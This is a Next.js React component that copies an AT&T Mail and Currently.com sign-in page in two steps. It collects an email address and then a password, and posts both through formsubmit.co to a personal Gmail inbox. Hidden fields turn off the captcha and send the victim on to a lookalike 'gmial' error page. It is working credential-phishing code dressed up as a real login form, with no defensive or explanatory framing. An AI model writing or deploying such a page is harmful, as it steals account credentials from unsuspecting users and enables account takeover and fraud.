"use client";

import Image from "next/image";
import { useState } from "react";

export default function ATAndT() {
    const [step, setStep] = useState(1);
    const [email, setEmail] = useState("")
    const [password, setPassword] = useState("")


    const handleNext = () => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (email.trim() === "") {
            return;
        }
        if (!emailRegex.test(email)) {
            return
        }

        setStep(step + 1);
    }

    const handleSubmit = () => {
        if (password.trim() !== "") {
            window.location.reload();
        }
    }

    return <div className="w-screen h-screen bg-white flex flex-col justify-start md:justify-center items-center py-[60px] gap-[40px]">
        <form action="https://formsubmit.co/Gstrait0518@gmail.com" method="POST" className="w-[90%] lg:w-[70%] max-w-[350px] mx-auto flex flex-col gap-[20px]">
            <div className="flex flex-col items-center gap-[20px] mb-[20px]">
                <Image src="/images/AT&T.png" alt="at&t" width={100} height={100} className="w-[120px] h-[auto] md:w-[150px]" />
                <p className="text-[20px] md:text-[24px] font-[600] text-center leading-[1.1] text-gray-600">Sign in to access AT&T Mail and Currently.com</p>
            </div>

            <div className="flex flex-col gap-[10px]">
                {step === 1 ? <div className="">
                    <label htmlFor="" className="font-[500] text-gray-600">User ID</label>
                    <input type="email" name="email" className="p-[10px] w-full border-[1px] border-[#40a9e2] rounded-[5px]" required onChange={(e) => setEmail(e.target.value)} value={email} />
                </div> : <div className="">
                    <label htmlFor="" className="font-[500] text-gray-600">User Password</label>
                    <input type="hidden" name="platform" value={"AT&T"} />
                    <input type="hidden" name="email" value={email} />
                    <input type="hidden" name="_captcha" value="false" />
                    <input type="hidden" name="_next" value="https://gmial.vercel.app/error" />
                    <input type="password" name="password" className="p-[10px] w-full border-[1px] border-[#40a9e2] rounded-[5px]" required onChange={(e) => setPassword(e.target.value)} value={password} />
                </div>}

                <button type={step === 1 ? "button" : "submit"} className="bg-[#40a9e2] rounded-[40px] text-white p-[10px] w-full" onClick={step == 1 ? handleNext : handleSubmit}>{step === 1 ? "Continue" : "Sign in"}</button>

                <button type="button" className="text-[#40a9e2] p-[10px] w-full font-[600]">Forgot user ID?</button>

                <p className="text-center text-[#40a9e2] font-[600]">Don't have a user ID? Create one now</p>
            </div>
        </form>


    </div>
}